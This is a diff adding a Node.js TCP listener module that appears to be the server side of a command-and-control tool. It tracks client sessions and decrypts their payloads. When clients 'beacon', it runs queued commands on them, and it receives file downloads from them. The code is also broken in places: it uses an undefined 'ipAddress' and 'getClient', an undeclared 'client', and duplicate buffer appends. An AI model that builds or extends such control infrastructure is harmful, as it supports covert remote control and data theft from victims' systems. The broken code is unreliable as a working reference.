@@ -1,0 +1,111 @@
+const { createServer } = require('node:net');
+const { logError, logInfo } = require('../modules/logging');
+const { decryptData } = require('../modules/encdec');
+const { handleDownloadResponse, handleResponse, handleBeacon } = require('../modules/handlers');
+const { executeQueuedCommands } = require('../modules/queue');
+const { getSessionId } = require('../modules/encdec');
+const { addClientSession, upsertClientSession } = require('../modules/clients');
+
+const config = require('../modules/config');
+let server = null; // server instance
+
+/**
+ * Creates the server connection for net.Socket
+ */
+const startSocketServer = () => {
+    server = createServer((socket) => {
+        const sessionId = getSessionId(ipAddress)
+        addClientSession(sessionId, socket);
+        socket.on('data', async (payload) => {
+            try {
+                if (payload.length >= config.data.chunk_size || payload.includes('--FIN--')) {
+                    // chunk mode
+                    client = getClient();
+                    upsertClientSession(sessionId, {waiting: true, buffer: client.buffer += payload})
+                    client.waiting = true;
+                    client.buffer += payload;
+                    if (client.buffer.includes('--FIN--')) {
+                        const bufferChunks = client.buffer.replace('--FIN--', '');
+                        const decrypted = await decryptData(bufferChunks.toString('utf8'), client.sessionId);
+                        const parsed = JSON.parse(decrypted);
+                        const response = parsed.response;
+                        if (response.download) {
+                            await handleDownloadResponse(response);
+                        } else {
+                            handleResponse(response);
+                        }
+                        client.waiting = false;
+                        client.buffer = '';
+                    }
+                } else {
+                    // non-chunk mode
+                    const decrypted = await decryptData(payload.toString('utf8'), client.sessionId);
+                    const parsed = JSON.parse(decrypted);
+                    const response = parsed.response;
+                    if (response.beacon) {
+                        handleBeacon(response, client);
+                        await executeQueuedCommands(client);
+                    } else if (response.download) {
+                        await handleDownloadResponse(response);
+                    } else if (response.error) {
+                        logError(response.error);
+                    } else {
+                        handleResponse(response);
+                    }
+                }
+            } catch(err) {
+                logError(err.message);
+            }
+        });
+        socket.on('end', () => {
+            logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`);
+            upsertClientSession(sessionId, {lastSeen: new Date(), active: false});
+        });
+        socket.on('error', (err) => {
+            logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`);
+            upsertClientSession(sessionId, {active: false});
+        });
+        socket.pipe(socket);
+    });
+
+    // Listen
+    listenSocketServer();
+};
+
+/**
+ * Starts listening on the socket 
+ */
+const listenSocketServer = () => {
+    server.listen(config.channels.tcp.port, config.server.host);
+
+    server.on('error', (err) => {
+        logError(`\nServer threw an error: ${err.message}`);
+        server.close();
+    });
+};
+
+/**
+ * Returns the server instance
+ * @returns Server
+ */
+const getServerInstance = () => {
+    return server;
+};
+
+/**
+ * Closes the socket server connection
+ */
+const closeSocketServer = async () => {
+    if (server) {
+        server.close(() => {
+            logInfo('\nServer connection closed');
+            server.unref();
+        });
+    }
+};
+
+module.exports = {
+    closeSocketServer,
+    getServerInstance,
+    startSocketServer
+};
